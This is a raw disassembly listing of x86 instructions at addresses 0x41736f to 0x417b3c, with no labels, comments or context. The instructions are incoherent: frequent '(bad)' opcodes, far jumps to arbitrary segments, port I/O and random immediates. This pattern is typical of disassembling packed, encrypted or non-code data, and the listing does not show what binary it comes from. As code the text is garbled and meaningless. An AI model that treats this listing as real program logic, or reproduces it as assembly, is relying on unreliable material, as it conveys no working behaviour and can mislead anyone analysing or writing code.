  41736f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417370:	fidivr DWORD PTR [esi+0x7a]
  417373:	int3   
  417374:	shl    DWORD PTR [esi],cl
  417376:	jl     0x41735c
  417378:	mov    WORD PTR [esi],es
  41737a:	xor    al,0xf6
  41737c:	sbb    eax,0x9f5662de
  417381:	test   al,0xd9
  417383:	mov    cl,0x62
  417385:	sbb    esp,edi
  417387:	repnz add DWORD PTR [ebx-0x44],ebx
  41738b:	add    DWORD PTR [eax+edx*8-0x7a],0x47
  417390:	mov    ah,0x6d
  417392:	icebp  
  417393:	(bad)  
  417394:	pushf  
  417395:	test   DWORD PTR cs:[eax-0x38e8d1e1],esi
  41739c:	xchg   esp,eax
  41739d:	xor    eax,0x5ffbac9e
  4173a2:	mov    WORD PTR [esp+ecx*2-0x2],cs
  4173a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173a7:	and    DWORD PTR [edx-0x1281e917],edx
  4173ad:	out    dx,eax
  4173ae:	add    eax,0xa6a8599
  4173b3:	(bad)  ds:0xf3fcf21e
  4173b9:	aas    
  4173ba:	and    BYTE PTR [ebx-0x11],bl
  4173bd:	push   esp
  4173be:	loope  0x41742a
  4173c0:	out    0xaf,eax
  4173c2:	bound  edi,QWORD PTR [ebx+0x24bfc3f0]
  4173c8:	fidiv  WORD PTR ds:0x725841aa
  4173ce:	inc    edi
  4173cf:	mov    ecx,0x3255e8a4
  4173d4:	sub    al,0x9a
  4173d6:	and    BYTE PTR [esi],0x90
  4173d9:	ja     0x417362
  4173db:	xchg   ebp,eax
  4173dc:	mov    cl,0x8f
  4173de:	cwde   
  4173df:	cld    
  4173e0:	je     0x417440
  4173e2:	sub    al,0xd4
  4173e4:	int3   
  4173e5:	xchg   ecx,eax
  4173e6:	dec    ecx
  4173e7:	adc    eax,0x41a870a4
  4173ec:	xchg   BYTE PTR [eax+0x23ee22a9],bl
  4173f2:	sub    DWORD PTR [eax],edx
  4173f4:	dec    ebx
  4173f5:	mov    dl,0xa3
  4173f7:	pop    ecx
  4173f8:	loope  0x4173db
  4173fa:	sbb    DWORD PTR [edi+0x328fc457],ebp
  417400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417401:	pusha  
  417402:	push   ds
  417403:	fidiv  DWORD PTR [edx+eiz*2]
  417406:	mov    edx,ebp
  417408:	xor    eax,0xa4795ac1
  41740d:	jmp    0x417436
  41740f:	xchg   edi,eax
  417410:	ds adc esi,esi
  417413:	mov    dl,BYTE PTR [ebp-0x71157ee2]
  417419:	sub    dh,BYTE PTR [ecx-0x39]
  41741c:	mov    ?,edx
  41741e:	fsubp  st(6),st
  417420:	sub    DWORD PTR [esi+0x739dd50b],edx
  417426:	cmp    BYTE PTR [esi+0x6ae5c600],cl
  41742c:	and    esp,edi
  41742e:	shr    BYTE PTR ds:0x5c6bc4f7,cl
  417434:	es adc eax,0x1586db65
  41743a:	jecxz  0x4174bb
  41743c:	inc    ebx
  41743d:	sbb    ah,BYTE PTR [ebx-0x2c]
  417440:	adc    BYTE PTR [eax-0x43],bh
  417443:	jae    0x4174bb
  417445:	sub    eax,0xa19196a8
  41744a:	pusha  
  41744b:	dec    eax
  41744c:	leave  
  41744d:	js     0x4173d1
  41744f:	xchg   ecx,esi
  417451:	mov    esp,0x908b713e
  417456:	mov    edx,0xe00055cb
  41745b:	cmp    BYTE PTR [ebp+0x57353638],bh
  417461:	ins    DWORD PTR es:[edi],dx
  417462:	mov    ds:0x2f9daedf,eax
  417467:	jmp    0xb596:0x8c83f91c
  41746e:	mov    dx,0x973f
  417472:	outs   dx,DWORD PTR ds:[esi]
  417473:	dec    ebx
  417474:	mov    ch,0x89
  417476:	enter  0x84cd,0x79
  41747a:	mov    dl,0x9
  41747c:	jg     0x41746e
  41747e:	imul   ebp,DWORD PTR [eax],0x55
  417481:	sub    BYTE PTR [edx+edx*8],ah
  417484:	fdiv   DWORD PTR [edi]
  417486:	jno    0x4174f7
  417488:	into   
  417489:	(bad)  
  41748b:	mov    esp,0x9defdbe5
  417490:	xchg   ebp,eax
  417491:	mov    ch,0x5d
  417493:	test   eax,0xc0d0f527
  417498:	scas   al,BYTE PTR es:[edi]
  417499:	mov    edx,0x1d8fe1d4
  41749e:	xor    cl,BYTE PTR [edi+0x764af626]
  4174a4:	ficomp DWORD PTR [edx]
  4174a6:	test   al,0x74
  4174a8:	sub    ah,BYTE PTR ds:0x159ee9f2
  4174ae:	push   eax
  4174af:	cmp    ecx,edi
  4174b1:	lods   eax,DWORD PTR ds:[esi]
  4174b2:	(bad)  
  4174b3:	mov    ebp,0xc7c98494
  4174b8:	retf   0x814e
  4174bb:	mov    ah,0x9f
  4174bd:	dec    ebp
  4174be:	push   edx
  4174bf:	sbb    BYTE PTR [eax-0x65],cl
  4174c2:	mov    dl,BYTE PTR [eax-0x6]
  4174c5:	scas   eax,DWORD PTR es:[edi]
  4174c6:	iret   
  4174c7:	cmp    eax,0xdabbb6ac
  4174cc:	into   
  4174cd:	xchg   BYTE PTR fs:0x23d9862f,dl
  4174d4:	inc    esi
  4174d5:	and    BYTE PTR [edx+ebx*4+0x17a354a7],dl
  4174dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174dd:	sbb    dh,cl
  4174df:	arpl   WORD PTR [ebx],di
  4174e1:	jge    0x4174a9
  4174e3:	mov    al,0xc2
  4174e5:	and    al,0xc6
  4174e7:	cmp    BYTE PTR [ebx],bl
  4174e9:	into   
  4174ea:	loop   0x417558
  4174ec:	repz aaa 
  4174ee:	cmp    BYTE PTR [esp+eax*2+0x3d712e43],0xd9
  4174f6:	test   al,0xc0
  4174f8:	sbb    eax,DWORD PTR gs:[edi+ebp*1+0x17416722]
  417500:	cmp    edi,ebp
  417502:	lds    edi,FWORD PTR [ebp+0xf31868f]
  417508:	(bad)  
  417509:	xlat   BYTE PTR ds:[ebx]
  41750a:	xor    BYTE PTR [esi],0x6f
  41750d:	mov    esp,esp
  41750f:	sub    eax,0x5cfb82d2
  417514:	push   edx
  417515:	sub    dl,BYTE PTR [esi+edx*2]
  417518:	imul   DWORD PTR [ecx]
  41751a:	mov    cl,0x95
  41751c:	xor    al,0xad
  41751e:	mov    ebp,0xe81bcd18
  417523:	fmul   DWORD PTR [bx+0x7864]
  417528:	int    0xe3
  41752a:	lods   al,BYTE PTR ds:[esi]
  41752b:	adc    al,0x28
  41752d:	mov    bl,0xbd
  41752f:	repnz retf 0x4870
  417533:	and    eax,0x8b240211
  417538:	sub    al,0xd6
  41753a:	push   esi
  41753b:	jnp    0x417571
  41753d:	ins    BYTE PTR es:[edi],dx
  41753e:	(bad)  
  41753f:	jmp    0xa5c5:0x1a858567
  417546:	out    dx,al
  417547:	js     0x41758b
  417549:	sub    esp,edx
  41754b:	xchg   esi,eax
  41754c:	mov    esi,esp
  41754e:	loop   0x4175aa
  417550:	fnstsw WORD PTR [edi+0x27f7db5e]
  417556:	(bad)  
  417557:	sub    ecx,edx
  417559:	sbb    al,0xff
  41755b:	adc    BYTE PTR [edi+0x45240b8c],dh
  417561:	sub    al,0x84
  417563:	dec    ebp
  417564:	ret    0x5dca
  417567:	aam    0xdd
  417569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41756a:	inc    DWORD PTR [edi-0x58]
  41756d:	inc    ebp
  41756e:	mov    bl,0x96
  417570:	mov    DWORD PTR ds:0xd723a450,esi
  417576:	jmp    0x417586
  417578:	adc    bl,al
  41757a:	add    dl,bh
  41757c:	pop    esp
  41757d:	arpl   WORD PTR [edx+0x11c034dd],di
  417583:	push   es
  417584:	sbb    cl,BYTE PTR [eax]
  417586:	out    0xfc,eax
  417588:	cdq    
  417589:	mov    WORD PTR [eax+0x52],cs
  41758c:	jg     0x41759c
  41758e:	sub    ecx,0x78
  417591:	daa    
  417592:	jo     0x417577
  417594:	ins    BYTE PTR es:[edi],dx
  417595:	sbb    al,0x37
  417597:	sub    eax,0xfc1cb145
  41759c:	in     eax,0x6d
  41759e:	rcl    DWORD PTR [eax],cl
  4175a0:	inc    ecx
  4175a1:	in     al,dx
  4175a2:	into   
  4175a3:	mov    ch,0x5b
  4175a5:	push   ebp
  4175a6:	pop    ebx
  4175a7:	bound  edi,QWORD PTR [eax-0xd]
  4175aa:	jmp    0x417532
  4175ac:	stos   BYTE PTR es:[edi],al
  4175ad:	scas   eax,DWORD PTR es:[edi]
  4175ae:	sti    
  4175af:	stos   BYTE PTR es:[edi],al
  4175b0:	(bad)  
  4175b1:	dec    ecx
  4175b2:	out    0x97,al
  4175b4:	jg     0x4175a1
  4175b6:	mov    bh,0xa
  4175b8:	mov    bh,0x63
  4175ba:	or     eax,0xfb62e663
  4175bf:	and    ch,BYTE PTR [ebx+ebx*8]
  4175c2:	ins    BYTE PTR es:[edi],dx
  4175c3:	xchg   ebx,eax
  4175c4:	xchg   esi,eax
  4175c5:	es push 0xaccfbe0d
  4175cb:	test   DWORD PTR [esi-0x7d],eax
  4175ce:	sub    BYTE PTR [ecx-0x521eaa10],0x83
  4175d5:	mov    edi,0x1e34f5d1
  4175da:	jne    0x4175cc
  4175dc:	pop    es
  4175dd:	push   ebx
  4175de:	outs   dx,BYTE PTR ds:[esi]
  4175df:	mov    edi,0x384e92aa
  4175e4:	ja     0x417608
  4175e6:	jbe    0x417588
  4175e8:	pusha  
  4175e9:	out    dx,eax
  4175ea:	adc    al,0x90
  4175ec:	(bad)  
  4175ed:	retf   0x478f
  4175f0:	retf   0x9d32
  4175f3:	adc    eax,0xa499489d
  4175f8:	(bad)  
  4175fa:	mov    ah,0xad
  4175fc:	push   eax
  4175fd:	jp     0x4175e1
  4175ff:	or     al,0x4f
  417601:	push   edi
  417602:	mov    dh,0x8d
  417604:	es in  eax,0xe6
  417607:	outs   dx,BYTE PTR ds:[esi]
  417608:	fs pop esp
  41760a:	test   al,0xe3
  41760c:	pushf  
  41760d:	das    
  41760e:	cdq    
  41760f:	or     bh,ch
  417611:	jb     0x417680
  417613:	imul   esp,DWORD PTR [esi],0xffffffa7
  417616:	jne    0x417602
  417618:	test   eax,0xad42c850
  41761d:	jnp    0x41767b
  41761f:	test   BYTE PTR [esi+0x61],0x23
  417623:	lock gs dec ebx
  417626:	sub    BYTE PTR [edx+0x35],ch
  417629:	mov    ebp,0x18eb64b9
  41762e:	mov    WORD PTR [edi],cs
  417630:	test   DWORD PTR [esi-0x4e],0xac2440e4
  417637:	add    ch,bl
  417639:	xchg   edx,eax
  41763a:	cmc    
  41763b:	or     eax,DWORD PTR [ecx]
  41763d:	dec    ebp
  41763e:	scas   eax,DWORD PTR es:[edi]
  41763f:	mov    ecx,DWORD PTR ds:0x9dd338
  417645:	mov    ds:0x9a9e2a82,eax
  41764a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41764b:	fcom   DWORD PTR [ecx]
  41764d:	xor    al,0x8d
  41764f:	pop    ds
  417650:	lods   al,BYTE PTR ds:[esi]
  417651:	inc    ecx
  417652:	call   0x4b96806d
  417657:	add    eax,0x75dfc7d7
  41765c:	dec    DWORD PTR [ecx-0x13]
  41765f:	xor    bl,BYTE PTR [ecx-0x47]
  417662:	jle    0x4176a2
  417664:	dec    eax
  417665:	ror    DWORD PTR [eax+ebp*1],0x2a
  417669:	idiv   BYTE PTR [edi]
  41766b:	test   eax,0x6c207a8f
  417670:	popf   
  417671:	enter  0xa4c1,0x71
  417675:	retf   0x9ed9
  417678:	out    dx,al
  417679:	data16 mov dh,0x73
  41767c:	mov    DWORD PTR [edx+0x7674],edi
  417682:	push   ecx
  417683:	repz data16 daa 
  417686:	sub    ah,ah
  417688:	jmp    0x7bc755ac
  41768d:	lock and DWORD PTR [eax+0x1e],esi
  417691:	adc    DWORD PTR [eax-0x21],edx
  417694:	enter  0xcb00,0x70
  417698:	retf   
  417699:	and    eax,0xa11391db
  41769e:	lods   al,BYTE PTR ds:[esi]
  41769f:	jmp    0xb5f1100c
  4176a4:	and    BYTE PTR [esp+edx*2],0x1b
  4176a8:	push   edx
  4176a9:	inc    esp
  4176aa:	int3   
  4176ab:	push   ss
  4176ac:	mov    WORD PTR [edi],es
  4176ae:	je     0x417694
  4176b0:	add    esi,DWORD PTR [eax-0x333560c9]
  4176b6:	pushf  
  4176b7:	es push esp
  4176b9:	popf   
  4176ba:	(bad)  
  4176bb:	pop    edx
  4176bc:	or     ebp,edx
  4176be:	mov    esp,0xb4ca8793
  4176c3:	std    
  4176c4:	sbb    eax,0xa463d183
  4176c9:	adc    esp,0x41142fcc
  4176cf:	bound  esp,QWORD PTR [ebx-0x61]
  4176d2:	inc    esi
  4176d3:	test   al,0x3
  4176d5:	js     0x41770b
  4176d7:	enter  0xb7d4,0x47
  4176db:	mov    eax,0x2a06c2dd
  4176e0:	mov    ds:0x9aeba914,eax
  4176e5:	popf   
  4176e6:	or     eax,DWORD PTR [ebx-0xd]
  4176e9:	dec    eax
  4176ea:	add    al,0x56
  4176ec:	add    ch,ch
  4176ee:	adc    al,0x5c
  4176f0:	mov    ebp,ecx
  4176f2:	fidiv  WORD PTR [ebp-0x2a]
  4176f5:	sub    edi,esp
  4176f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f8:	push   ecx
  4176f9:	(bad)  
  4176fa:	(bad)  
  4176fb:	push   cs
  4176fc:	inc    ebx
  4176fd:	call   0x690e2ce4
  417702:	pop    edi
  417703:	pushf  
  417704:	fstp   DWORD PTR [ecx-0x58]
  417707:	push   ebx
  417708:	mov    eax,ds:0x96049e30
  41770d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770e:	ins    DWORD PTR es:[edi],dx
  41770f:	ds shr DWORD PTR cs:[esi+0x51],cl
  417714:	mov    esp,0xae30a1fe
  417719:	push   0x59
  41771b:	lock jnp 0x4176ec
  41771e:	mov    esp,DWORD PTR [edi-0x32]
  417721:	cmp    eax,0xa8fc771c
  417726:	lods   eax,DWORD PTR ds:[esi]
  417727:	xor    DWORD PTR [edi-0x637a84ed],ebx
  41772d:	nop
  41772e:	dec    edx
  41772f:	jns    0x41777f
  417731:	push   edx
  417732:	jmp    0x5c6e:0x61a3e77e
  417739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41773a:	adc    edx,ebx
  41773c:	nop
  41773d:	inc    ecx
  41773e:	arpl   WORD PTR [ebx],sp
  417740:	inc    esp
  417741:	fisubr WORD PTR [eax]
  417743:	mov    ah,0xfa
  417745:	push   ebp
  417746:	repnz push 0xe01e283a
  41774c:	call   0xa04e:0x2080fa10
  417753:	pop    es
  417754:	dec    edi
  417755:	mov    ds:0x5ccbf111,eax
  41775a:	xchg   esp,eax
  41775b:	retf   
  41775c:	inc    eax
  41775d:	or     edx,esi
  41775f:	inc    ebx
  417760:	push   ecx
  417761:	fnstcw WORD PTR [esi+0x2c]
  417764:	pusha  
  417765:	pop    ebx
  417766:	xchg   esi,ecx
  417768:	sub    bl,dh
  41776a:	sbb    dh,BYTE PTR [esi]
  41776c:	push   cs
  41776d:	loopne 0x41779f
  41776f:	jmp    ebx
  417771:	xchg   ebp,eax
  417772:	repz adc DWORD PTR gs:[ecx-0x66b8c40],0x8405f48b
  41777e:	adc    DWORD PTR [ebx-0x136aa6ef],eax
  417784:	stos   DWORD PTR es:[edi],eax
  417785:	jb     0x4177db
  417787:	ins    DWORD PTR es:[edi],dx
  417788:	icebp  
  417789:	add    eax,0xa0e4d4c2
  41778e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41778f:	mov    eax,0x9ae41a35
  417794:	jno    0x417756
  417796:	pop    edi
  417797:	mov    ebx,0xef5cef22
  41779c:	cmp    al,0x55
  41779e:	(bad)  
  41779f:	mov    ebx,0x54cf9a14
  4177a4:	loope  0x417820
  4177a6:	pop    edx
  4177a7:	jne    0x41777c
  4177a9:	pop    edx
  4177aa:	cmp    BYTE PTR [ecx-0x5cedacfa],bh
  4177b0:	jecxz  0x417777
  4177b2:	xor    ch,dl
  4177b4:	ds call 0xb114:0xdc131a7e
  4177bc:	(bad)  
  4177bd:	outs   dx,DWORD PTR ds:[esi]
  4177be:	loop   0x4177a0
  4177c0:	stos   BYTE PTR es:[edi],al
  4177c1:	adc    BYTE PTR [ebx+0x3a],ch
  4177c4:	stos   DWORD PTR es:[edi],eax
  4177c5:	repz jo 0x41775c
  4177c8:	dec    esi
  4177c9:	inc    edx
  4177ca:	mov    esi,0x7101c7d5
  4177cf:	and    dh,BYTE PTR [ecx+eax*8+0x62]
  4177d3:	fld    QWORD PTR [ebx+0x1d]
  4177d6:	push   es
  4177d7:	call   0x6a531c17
  4177dc:	jmp    0xf3040d80
  4177e1:	jno    0x417859
  4177e3:	iret   
  4177e4:	pop    esp
  4177e5:	aam    0x48
  4177e7:	and    edi,DWORD PTR [esi+0x24]
  4177ea:	cli    
  4177eb:	mov    edi,0x90475fea
  4177f0:	jle    0x4177ee
  4177f2:	ret    0xe9ab
  4177f5:	add    dh,BYTE PTR [esi-0x57]
  4177f8:	aam    0xa
  4177fa:	xchg   edx,eax
  4177fb:	(bad)  [edi]
  4177fd:	test   al,0xda
  4177ff:	int3   
  417800:	lods   eax,DWORD PTR ds:[esi]
  417801:	(bad)  gs:[edi]
  417804:	jecxz  0x417848
  417806:	pushf  
  417807:	jb     0x4177eb
  417809:	dec    ebp
  41780a:	cmc    
  41780b:	pop    edi
  41780c:	xor    al,0x92
  41780e:	mov    edi,0xf96b69a2
  417813:	imul   edx,DWORD PTR [edx-0x7490d983],0x9c3e4f08
  41781d:	jecxz  0x4177f3
  41781f:	lahf   
  417820:	jg     0x417882
  417822:	add    eax,0xdbe34f87
  417827:	mov    al,0xfe
  417829:	mov    ah,0x22
  41782b:	pop    ds
  41782c:	ds test ch,ah
  41782f:	dec    eax
  417830:	inc    ecx
  417831:	hlt    
  417832:	xchg   ebp,eax
  417833:	fisttp DWORD PTR [ebp-0x568f4f07]
  417839:	bound  ebx,QWORD PTR [edi]
  41783b:	hlt    
  41783c:	jb     0x41785b
  41783e:	mov    eax,0x81c5ba6e
  417843:	mov    ch,0x30
  417845:	lds    eax,FWORD PTR [ecx]
  417847:	or     ah,cl
  417849:	test   eax,0x7b4210fa
  41784e:	and    eax,0x2487fee2
  417853:	mov    WORD PTR [eax+0x30],?
  417856:	add    bh,BYTE PTR [edx+0x4d]
  417859:	test   eax,0x2db4c377
  41785e:	dec    esi
  41785f:	gs inc eax
  417861:	cmp    eax,0x98f696ae
  417866:	mov    eax,ds:0xa6b42476
  41786b:	xchg   ebp,eax
  41786c:	ret    
  41786d:	(bad)  
  41786e:	fist   DWORD PTR [edx+edx*8+0xb]
  417872:	fwait
  417873:	(bad)  
  417874:	push   ds
  417875:	sub    DWORD PTR [edx+esi*1+0x8],0xffffffaa
  41787a:	push   ebp
  41787b:	jg     0x417881
  41787d:	jo     0x417867
  41787f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417880:	mov    ah,0x36
  417882:	icebp  
  417883:	and    esp,edx
  417885:	mov    al,0x8a
  417887:	stos   BYTE PTR es:[edi],al
  417888:	jns    0x417891
  41788a:	cmp    eax,0x932941b4
  41788f:	cmp    al,0x21
  417891:	and    ecx,eax
  417893:	push   0xffffffc9
  417895:	(bad)  
  417896:	adc    edi,DWORD PTR [ebx]
  417898:	pop    ecx
  417899:	xchg   esi,eax
  41789a:	jo     0x4178b6
  41789c:	data16 adc BYTE PTR [ecx],dl
  41789f:	js     0x417835
  4178a1:	outs   dx,DWORD PTR ds:[esi]
  4178a2:	retf   0x9d0d
  4178a5:	pop    esi
  4178a6:	sub    ah,ch
  4178a8:	cmp    BYTE PTR [edi-0x6e84e698],bh
  4178ae:	mov    al,ds:0xa7d10031
  4178b3:	and    al,0x8c
  4178b5:	shl    BYTE PTR ds:0x44295186,0xf0
  4178bc:	or     al,0x5d
  4178be:	test   eax,0xeda5be29
  4178c3:	in     al,0x50
  4178c5:	mov    esp,0x8e9b0046
  4178ca:	loop   0x4178c7
  4178cc:	push   edx
  4178cd:	push   0x8b1dc5f4
  4178d2:	(bad)  
  4178d3:	jmp    0x9afc:0xc9efc79
  4178da:	push   edi
  4178db:	retf   
  4178dc:	add    ecx,ebp
  4178de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178df:	push   es
  4178e0:	ud2    
  4178e2:	add    DWORD PTR [esi],ebx
  4178e4:	mov    ecx,0xabefcd14
  4178e9:	loopne 0x417932
  4178eb:	inc    ebx
  4178ec:	push   edx
  4178ed:	dec    ebp
  4178ee:	js     0x41794f
  4178f0:	mov    eax,0xf7befd2d
  4178f5:	rcr    BYTE PTR [edi-0x34],0x17
  4178f9:	jg     0x417912
  4178fb:	mov    ss,WORD PTR [ebx-0x3de1ed55]
  417901:	out    dx,eax
  417902:	pop    ebx
  417903:	inc    edx
  417904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417905:	jecxz  0x41791e
  417907:	aaa    
  417908:	jne    0x41788e
  41790a:	pop    ebp
  41790b:	pop    edi
  41790c:	arpl   bx,sp
  41790e:	mov    cl,0x72
  417910:	push   ebp
  417911:	mov    ds:0xfb8df26e,al
  417916:	(bad)  
  417918:	(bad)  
  417919:	repz push ss
  41791b:	sub    cl,BYTE PTR [eax-0x19abbf45]
  417921:	xchg   ebx,eax
  417922:	out    0x48,al
  417924:	cmp    edi,DWORD PTR [ebp+eiz*1+0xa]
  417928:	push   edi
  417929:	cmp    BYTE PTR [edi-0x66],0xa9
  41792d:	leave  
  41792e:	pop    ebp
  41792f:	mov    cl,0x91
  417931:	scas   eax,DWORD PTR es:[edi]
  417932:	cmp    cl,BYTE PTR [ecx+0xa]
  417935:	test   eax,0xb632975
  41793a:	add    DWORD PTR [edx],ecx
  41793c:	and    al,0x81
  41793e:	das    
  41793f:	fnstsw WORD PTR [ebx+edx*2+0x59]
  417943:	dec    eax
  417944:	cmp    DWORD PTR [eax+0x761074b0],ecx
  41794a:	mov    fs,WORD PTR [eax-0x2bc0406e]
  417950:	jecxz  0x4178df
  417952:	div    al
  417954:	mov    ds:0x31a9fd54,eax
  417959:	xor    DWORD PTR [eax],edi
  41795b:	push   es
  41795c:	pop    edi
  41795d:	adc    ebp,ebp
  41795f:	sar    DWORD PTR [ebx+0x3fddee7f],cl
  417965:	pusha  
  417966:	(bad)  
  417967:	call   0x7fc96bff
  41796c:	pop    esp
  41796d:	mov    dl,0x52
  41796f:	and    eax,0x87ad7757
  417974:	xor    edx,DWORD PTR [ecx-0x9]
  417977:	mov    ds:0xdf06caaa,eax
  41797c:	jb     0x4179dd
  41797e:	sub    BYTE PTR [ebx-0x56e9abf2],dl
  417984:	push   ecx
  417985:	in     al,0xe7
  417987:	mov    ds:0x79dc46d0,eax
  41798c:	cmp    al,0x86
  41798e:	mov    eax,ds:0xd6bf1b60
  417993:	popf   
  417994:	or     dl,al
  417996:	aad    0x37
  417998:	xchg   ecx,eax
  417999:	fisttp QWORD PTR [eax]
  41799b:	in     eax,dx
  41799c:	inc    esi
  41799d:	int3   
  41799e:	inc    esp
  41799f:	jmp    0x417a09
  4179a1:	inc    ecx
  4179a2:	jge    0x417934
  4179a4:	fisttp DWORD PTR [ecx-0xcbf4921]
  4179aa:	bound  ecx,QWORD PTR [esi]
  4179ac:	test   eax,0xd0367263
  4179b1:	add    BYTE PTR [ebx+0x1034c153],dl
  4179b7:	push   ebp
  4179b8:	test   al,0x24
  4179ba:	aam    0x75
  4179bc:	jl     0x417964
  4179be:	ds ins BYTE PTR es:[edi],dx
  4179c0:	dec    edx
  4179c1:	adc    BYTE PTR [ecx-0x566f8a9],0x21
  4179c8:	xchg   esp,eax
  4179c9:	mov    cl,0xb2
  4179cb:	popa   
  4179cc:	push   edi
  4179cd:	xor    DWORD PTR ds:[ebp+0x6e2eb20b],ecx
  4179d4:	mov    bl,0xe4
  4179d6:	jbe    0x4179f2
  4179d8:	fisubr DWORD PTR [esi]
  4179da:	and    eax,0x1795ea94
  4179df:	iret   
  4179e0:	inc    esi
  4179e1:	jnp    0x417965
  4179e3:	inc    ebp
  4179e4:	xchg   ebx,eax
  4179e5:	push   es
  4179e6:	stos   BYTE PTR es:[edi],al
  4179e7:	jg     0x417a02
  4179e9:	push   cs
  4179ea:	in     eax,dx
  4179eb:	xor    eax,0x581a02da
  4179f0:	jae    0x417996
  4179f2:	mov    ah,0xd7
  4179f4:	add    BYTE PTR [edi+0x3024854a],0x6f
  4179fb:	retf   0xc7fa
  4179fe:	or     al,ah
  417a00:	popf   
  417a01:	pusha  
  417a02:	add    al,0xcb
  417a04:	(bad)  
  417a05:	push   esp
  417a06:	inc    eax
  417a07:	hlt    
  417a08:	stc    
  417a09:	xor    al,0x11
  417a0b:	call   0xd5d4:0xc12f39cd
  417a12:	lds    esp,FWORD PTR [ecx-0x78]
  417a15:	cmp    al,0x66
  417a17:	stos   DWORD PTR es:[edi],eax
  417a18:	stc    
  417a19:	scas   eax,DWORD PTR es:[edi]
  417a1a:	outs   dx,DWORD PTR ds:[esi]
  417a1b:	jns    0x4179c1
  417a1d:	ja     0x417a0b
  417a1f:	xlat   BYTE PTR ds:[ebx]
  417a20:	inc    eax
  417a21:	xchg   esi,eax
  417a22:	sbb    dh,ah
  417a24:	sbb    BYTE PTR [esi+0x1c05b316],bl
  417a2a:	in     eax,dx
  417a2b:	scas   al,BYTE PTR es:[edi]
  417a2c:	xor    edi,ebp
  417a2e:	rcl    DWORD PTR ds:0x3d3873bf,0x12
  417a35:	pop    esi
  417a36:	arpl   WORD PTR [ebx-0x2e],si
  417a39:	lea    ebx,[ebx+edx*2]
  417a3c:	call   FWORD PTR [ecx]
  417a3e:	add    ebx,DWORD PTR [esi-0x4f]
  417a41:	xchg   esp,eax
  417a42:	arpl   WORD PTR [ebp+0x75d8ee69],dx
  417a48:	ins    BYTE PTR es:[edi],dx
  417a49:	pop    eax
  417a4a:	call   0x7581a283
  417a4f:	out    dx,al
  417a50:	lahf   
  417a51:	jmp    0x1d2f:0xbf10778a
  417a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a59:	xor    BYTE PTR [edx+0x4d],0xd7
  417a5d:	pop    es
  417a5e:	xchg   ebx,eax
  417a5f:	cmp    al,0xdf
  417a61:	bound  ebx,QWORD PTR [ebp+0x440867c9]
  417a67:	xchg   BYTE PTR [ebx+0x471201fd],dl
  417a6d:	out    0xc5,al
  417a6f:	enter  0x71a5,0xaa
  417a73:	cmp    eax,0xb5f5b619
  417a78:	xchg   ebp,eax
  417a79:	add    BYTE PTR [eax+0x50],al
  417a7c:	mov    ebp,0x88c038ba
  417a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a82:	dec    esi
  417a83:	cmp    ebp,DWORD PTR [eax-0x4]
  417a86:	out    dx,eax
  417a87:	dec    edx
  417a88:	sbb    al,0xed
  417a8a:	xchg   edx,eax
  417a8b:	pop    ecx
  417a8c:	ja     0x417a10
  417a8e:	mov    edx,0x100fc41e
  417a93:	mov    esp,0xaf5f70c8
  417a98:	sbb    BYTE PTR [edi],0xb7
  417a9b:	xor    BYTE PTR [ebx-0x37],0xa3
  417a9f:	xor    DWORD PTR [eax-0x6e],edi
  417aa2:	inc    eax
  417aa3:	hlt    
  417aa4:	hlt    
  417aa5:	add    bl,BYTE PTR [ebx-0xec6b5de]
  417aab:	jl     0x417b11
  417aad:	cmp    BYTE PTR [ebp+0x40a90f87],bl
  417ab3:	adc    esp,DWORD PTR [edx-0x74]
  417ab6:	cwde   
  417ab7:	push   ss
  417ab8:	outs   dx,BYTE PTR ds:[esi]
  417ab9:	xor    BYTE PTR [ebp-0x1bfb8d3f],cl
  417abf:	jo     0x417adc
  417ac1:	mov    ebx,0x985d4eca
  417ac6:	add    DWORD PTR [edi],ebp
  417ac8:	pop    ss
  417ac9:	jl     0x417ae1
  417acb:	pop    esp
  417acc:	int3   
  417acd:	call   DWORD PTR [ebp-0x27542816]
  417ad3:	dec    ebx
  417ad4:	cli    
  417ad5:	(bad)  
  417ad6:	jb     0x417b13
  417ad8:	into   
  417ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ada:	popa   
  417adb:	ins    DWORD PTR es:[edi],dx
  417adc:	in     eax,0xe8
  417ade:	dec    ecx
  417adf:	dec    esi
  417ae0:	scas   eax,DWORD PTR es:[edi]
  417ae1:	cli    
  417ae2:	and    cl,BYTE PTR [ecx+0x3]
  417ae5:	aad    0xc5
  417ae7:	int3   
  417ae8:	push   0x1e42c56
  417aed:	mov    edi,0x6adc4e5a
  417af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af3:	push   0x4d
  417af5:	mov    gs,WORD PTR [eax+0x72]
  417af8:	mov    dh,0xc3
  417afa:	outs   dx,BYTE PTR ds:[esi]
  417afb:	xchg   DWORD PTR [esp+esi*1],ebp
  417afe:	shl    DWORD PTR [edx-0x77],1
  417b01:	mov    edx,0xca937dfa
  417b06:	jl     0x417b72
  417b08:	mov    ds:0x32a442d9,eax
  417b0d:	mov    eax,ds:0xf99d770f
  417b12:	mov    BYTE PTR [esi+0x9],ah
  417b15:	pop    ecx
  417b16:	dec    eax
  417b17:	pop    eax
  417b18:	fcom   DWORD PTR ds:0x52be66f
  417b1e:	in     eax,0x6e
  417b20:	popf   
  417b21:	mov    edi,0xbb04e160
  417b26:	add    eax,0xc69a9e2d
  417b2b:	cmp    edi,0xdcd72cd5
  417b31:	ja     0x417b83
  417b33:	sub    esi,DWORD PTR [ebp+0x36]
  417b36:	dec    eax
  417b37:	xor    al,0x5a
  417b39:	into   
  417b3a:	push   ss
  417b3b:	fwait
  417b3c:	mov    ch,0xe3
